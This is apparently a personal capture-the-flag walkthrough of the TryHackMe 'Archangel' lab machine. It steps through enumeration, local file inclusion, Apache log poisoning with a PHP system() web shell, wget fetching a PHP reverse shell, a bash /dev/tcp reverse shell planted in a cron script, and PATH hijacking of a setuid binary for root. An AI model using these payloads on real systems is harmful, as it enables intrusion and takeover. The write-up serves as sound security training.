# Enumeration
## ping scan
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ ping 10.10.32.78           
PING 10.10.32.78 (10.10.32.78) 56(84) bytes of data.
64 bytes from 10.10.32.78: icmp_seq=1 ttl=63 time=54.1 ms
64 bytes from 10.10.32.78: icmp_seq=2 ttl=63 time=52.4 ms
^C
--- 10.10.32.78 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 52.407/53.232/54.057/0.825 ms
```
Notes: host is up
## nmap scan
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ sudo nmap -A -p- -oN nmap_results.txt 10.10.32.78  
[sudo] password for sami: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 12:35 EET
Nmap scan report for 10.10.32.78
Host is up (0.061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/5%OT=22%CT=1%CU=38828%PV=Y%DS=2%DC=T%G=Y%TM=63663C8
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=FE%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11N
OS:W7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R
OS:=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.81 ms 10.11.0.1
2   59.85 ms 10.10.32.78

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds
```
Notes: 
- ssh open on 22
- http open on 80
## http website
![[Pasted image 20221105125742.png]]
Notes: 
- send us a mail: domain name `mafialive.thm`
- added `mafialive.thm` to `/etc/hosts`
## http dir scan
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ gobuster dir -u http://10.10.32.78 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -o gobuster_results.txt -x txt,php,html,js -t 20
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://10.10.32.78/images/]
/index.html           (Status: 200) [Size: 19188]
/pages                (Status: 301) [Size: 310] [--> http://10.10.32.78/pages/]
/flags                (Status: 301) [Size: 310] [--> http://10.10.32.78/flags/]
/layout               (Status: 301) [Size: 311] [--> http://10.10.32.78/layout/]
```
## http dir big scan
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ gobuster dir -u http://mafialive.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_big.txt -x txt,php,html,js -t 20
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
```
Notes: 
- `robots.txt` 
	- Disallow: `/test.php`
- `test.php`
## manual work
### visit `mafialive.thm/test.php`
![[Pasted image 20221105130353.png]]

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="[/test.php?view=/var/www/html/development_testing/mrrobot.php](view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php)"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```
Notes: 
- LFI vulnerable
- Clicking on the "Here is a button" will return "Control is an illusion".
# Weaponization
## LFI payloads testing
### `/etc/passwd`
![[Pasted image 20221105131351.png]]
## PHP Wrapper php://filter from highon.coffee
`example1.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
# Delivery
## pasting the forget payload after ? in the url
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
# Exploitation
## obtaining test.php code
```base64
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
```
# Post-Exploit-Enum
## decoding the test.php encoded code
```html
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: XXXXXXXXXXXXX

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
Notes:
- if the user input does NOT contain `../..` AND contains `/var/www/html/development_testing` then the PHP code will parse and will show output.
- if the input contains other than the above statements, the PHP code will show error.
# Weaponization 2
## forging PHP payload workaround the if statement
- Original `/var/www/html/development_testing/mrrobot.php`
# Delivery 2
## testing LFI through the url
- Modified 1 `/var/www/html/development_testing/.././.././.././../etc/passwd`
```html
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="[/test.php?view=/var/www/html/development_testing/mrrobot.php](view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php)"><button id="secret">Here is a button</button></a><br>
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
    </div>
</body>

</html>
```
Notes: works, let's get more sophisticated 
# Exploitation 2
### accessing the log file 
`?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log`
### adding [[php cmd in the User-Agent]] for log poisoning
`<?php system($_GET['cmd']);?>`
### the response
```html
HTTP/1.1 200 OK
Date: Sat, 05 Nov 2022 12:21:15 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 4442
Connection: close
Content-Type: text/html; charset=UTF-8

	
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        
10.11.4.14 - - [05/Nov/2022:17:36:22 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log HTTP/1.1" 200 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"
...
10.11.4.14 - - [05/Nov/2022:17:50:54 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log HTTP/1.1" 400 0 "-" "-"
    </div>
</body>

</html>
```
# Establishing Persistence 
## php reverse shell and python3 server
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```
## forging url payload to pull the reverse shell from our server
`mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget http://10.11.4.14:8001/prs.php`
### results
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.25.236 - - [05/Nov/2022 14:30:21] "GET /prs.php HTTP/1.1" 200 -
```
## setting up a netcat listener
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ nc -nvlp 1234              
listening on [any] 1234 ...
```
## calling the php-reverse-shell
`GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=php+prs.php`
## results
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ nc -nvlp 1234              
listening on [any] 1234 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.25.236] 40098
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:28:13 up  1:54,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# Priv-Esc
## uploading linpeas.sh
```sh
$ wget http://10.11.4.14:8001/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
--2022-11-05 19:31:07--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  411K 2s
    50K .......... .......... .......... .......... .......... 12%  827K 1s
   100K .......... .......... .......... .......... .......... 18%  832K 1s
   150K .......... .......... .......... .......... .......... 24%  840K 1s
   200K .......... .......... .......... .......... .......... 30%  839K 1s
   250K .......... .......... .......... .......... .......... 37%  786K 1s
   300K .......... .......... .......... .......... .......... 43% 10.1M 1s
   350K .......... .......... .......... .......... .......... 49%  836K 0s
   400K .......... .......... .......... .......... .......... 55%  834K 0s
   450K .......... .......... .......... .......... .......... 61%  839K 0s
   500K .......... .......... .......... .......... .......... 68%  841K 0s
   550K .......... .......... .......... .......... .......... 74%  840K 0s
   600K .......... .......... .......... .......... .......... 80%  838K 0s
   650K .......... .......... .......... .......... .......... 86%  837K 0s
   700K .......... .......... .......... .......... .......... 92%  837K 0s
   750K .......... .......... .......... .......... .......... 98%  841K 0s
   800K ........                                              100% 9.93M=1.0s

2022-11-05 19:31:08 (836 KB/s) - 'linpeas.sh' saved [827827/827827]
```
## linpeas.sh results
- Cron jobs
	- `*/1 *   * * *   archangel /opt/helloworld.sh`
- Users & groups
	- `uid=0(root) gid=0(root) groups=0(root)`
	- `uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)`
- `/usr/share/openssh/sshd_config`
## manual enum
```sh
$ cd /opt
$ ls -hla       
total 16K
drwxrwxrwx  3 root      root      4.0K Nov 20  2020 .
drwxr-xr-x 22 root      root      4.0K Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4.0K Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
$ cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```
Notes: remember the cronjob that we saw, it runs this script as archangel.
## [[Upgrade The Shell]]
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
## add to the script [[netcat reverse shell]]
```sh
echo '#!/bin/bash' > helloworld.sh
echo "nc -e /bin/bash 10.11.4.14 1337" >> helloworld.sh
```
Notes: did not work
## add to the script [[bash reverse shell]]
```sh
echo '#!/bin/bash' > helloworld.sh
echo "bash -i >& /dev/tcp/10.11.4.14/1337 0>&1" >> helloworld.sh
```
Notes: worked
```sh
sami@bt:~/Documents/THM/CTFs/b3dr0ck$ nc -nvlp 1337 
listening on [any] 1337 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.25.236] 50878
bash: cannot set terminal process group (14610): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ 
```
## rooting
```sh
archangel@ubuntu:~/secret$ ls
ls
backup
user2.txt
archangel@ubuntu:~/secret$ file backup
file backup
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
archangel@ubuntu:~/secret$ 
```
Notes: ELF file
### investigating the elf file
```sh
sami@bt:~/Documents/THM/CTFs/Archangel$ strings backup 
...
cp /home/user/archangel/myfiles/* /opt/backupfiles
...
sami@bt:~/Documents/THM/CTFs/Archangel$ 
```
Notes: reading the binary strings we notice that cp has no properly specified path. we can exploit that by making a malicious cp binary in tmp and let bash execute it before the legit cp binary by modifying the $PATH.
```sh
archangel@ubuntu:/tmp$ ls
ls
systemd-private-c7b294b0445f4049b7c2417d8249f0e1-apache2.service-ZfyzVD
systemd-private-c7b294b0445f4049b7c2417d8249f0e1-systemd-resolved.service-rupaKn
systemd-private-c7b294b0445f4049b7c2417d8249f0e1-systemd-timesyncd.service-5zGasv
archangel@ubuntu:/tmp$ echo '#!/bin/bash' > cp
echo '#!/bin/bash' > cp
archangel@ubuntu:/tmp$ echo 'bash -p' >> cp       
echo 'bash -p' >> cp
archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
archangel@ubuntu:/tmp$ chmod +x cp
chmod +x cp
archangel@ubuntu:/tmp$ cd ~/secret
cd ~/secret
archangel@ubuntu:~/secret$ ./backup
./backup
whoami
root
cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
# Done